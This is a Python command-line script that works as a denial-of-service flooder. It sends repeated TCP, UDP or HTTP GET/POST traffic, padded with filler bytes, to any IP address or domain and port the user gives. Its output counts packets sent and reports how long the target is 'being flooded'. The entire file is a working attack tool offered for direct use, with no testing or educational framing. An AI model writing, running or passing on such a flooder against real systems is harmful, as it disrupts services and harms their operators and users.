import sys
import re
import getpass
import time
import socket, requests

SUPPORTED_ACTIONS = ("tcp", "s-tcp", "l-tcp", "udp", "s-udp", "l-udp", "http-get", "http-post")
IP_PATTERN = r'^((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?):([1-9]\d*|0)$'
DOMAIN_PATTERN = r'^([a-zA-Z0-9]([a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}:([1-9]\d*|0)$'

sent_bytes = 0

def help(msg: str = ""):
    print(f"""\
Usage: {sys.argv[0]} [{", ".join(SUPPORTED_ACTIONS)}] <ip/domain>:<port>

Examples:
\t{sys.argv[0]} tcp example.com:8443
\t{sys.argv[0]} udp-s 1.1.1.1:53
""")
    sys.exit(0)

def parse_argv(argv: list) -> tuple[str, list[tuple[str, int]]]:
    if len(argv) <3:
        help()
        return
    if argv[1] == "help":
        help()
        return
    argv = argv[1:]

    action = argv[0]
    if action not in SUPPORTED_ACTIONS:
        help(f"Unknown action: {action}!")
        return
    
    r_targets = argv[1:]
    targets = list()
    for target in r_targets:
        if re.match(IP_PATTERN, target):
            pass
        elif re.match(DOMAIN_PATTERN, target):
            pass
        else:
            help("Invalid IP / domain!")
            return
        targets.append((target.split(":")[0], int(target.split(":")[1])))
    return action, targets

def cycle(func, counter: int, startfrom = 0, prefix="  "):
    global sent_bytes
    try:
        sent = startfrom
        while 1:
            packet = func()
            sent += 1
            sent_bytes += packet.__sizeof__()

            if sent % counter == 0:
                print(f"{prefix}Sent {sent} packets. Sent {sent_bytes/1024/1024:.3f} mB")
                prefix = "  "
    except KeyboardInterrupt:
        print(f"\nStopping... ({target[0]})")
        return
    except OSError as e:
        if e.errno == 55:
            try:
                time.sleep(0.25)
            except KeyboardInterrupt:
                print(f"\nStopping... ({target[0]})")
                return
            cycle(func, counter, sent, "O ")
        else:
            print(f"Got an error: {e}. Continue?")
            try:
                getpass.getpass("Enter to continue, Ctrl+C to stop: ")
                print("O ", end="")
                cycle(func, counter, sent, True)
            except KeyboardInterrupt:
                print(f"\nStopping... ({target[0]})")
                return

def dos(target: tuple[str, int], method: str):
    ip = target[0]
    if re.match(DOMAIN_PATTERN, f"{target[0]}:{target[1]}"):
        try: ip = socket.gethostbyname(target[0])
        except Exception as e: raise NameError(f"Couldn't find server: {target[0]} ({e})")
    print(f"\nStarting... ({target[0]})")
    match method:
        case "tcp" | "s-tcp" | "l-tcp":
            packet = ("A"*1024*24).encode("ascii") if method == "tcp" else ("A" * 2048).encode("ascii")
            packet = ("A"*1024*48).encode("ascii") if method == "l-tcp" else packet
            print(f"Sending TCP Packets. Mode: {"Large" if method=="l-tcp" else ("Normal" if method=="tcp" else "Small")}. Packet size: {packet.__sizeof__()} bytes")
            def tcp():
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip, target[1]))
                s.sendall(packet)
                s.close()
                return packet
            cycle(tcp, 1 if method=="l-tcp" else (5 if method=="tcp" else 10))
        case "udp" | "s-udp" | "l-udp":
            packet = ("A"*4096).encode("ascii") if method == "udp" else ("A" * 2048).encode("ascii")
            packet = ("A"*1024*8).encode("ascii") if method == "l-udp" else packet
            print(f"Sending UDP Packets. Mode: {"Large" if method=="l-udp" else ("Normal" if method=="udp" else "Small")}. Packet size: {packet.__sizeof__()} bytes")
            def udp():
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.sendto(packet, (ip, target[1]))
                s.close()
                return packet
            cycle(udp, 500 if method=="l-udp" else (1000 if method=="udp" else 2000))
        case "http-get":
            print(f"Sending HTTP Requests. Mode: GET")
            def get():
                requests.get(f"http://{ip}:{target[1]}", data={"A"*128 : "A"*256})
                return {"A"*128 : "A"*256}
            cycle(get, 10)
        case "http-post":
            print(f"Sending HTTP Requests. Mode: POST")
            def post():
                requests.post(f"http://{ip}:{target[1]}", data={"A"*1024 : "A"*1024})
                return {"A"*1024 : "A"*1024}
            cycle(post, 10)


if __name__ == "__main__":
    args = parse_argv(sys.argv)
    for target in args[1]:
        try:
            start_time = time.time()
            dos(target, args[0])
            print(f"Being flooded by {time.time()-start_time:.2f} sec")
        except NameError as e:
            print(e)
        except RecursionError:
            print("Attack ended")
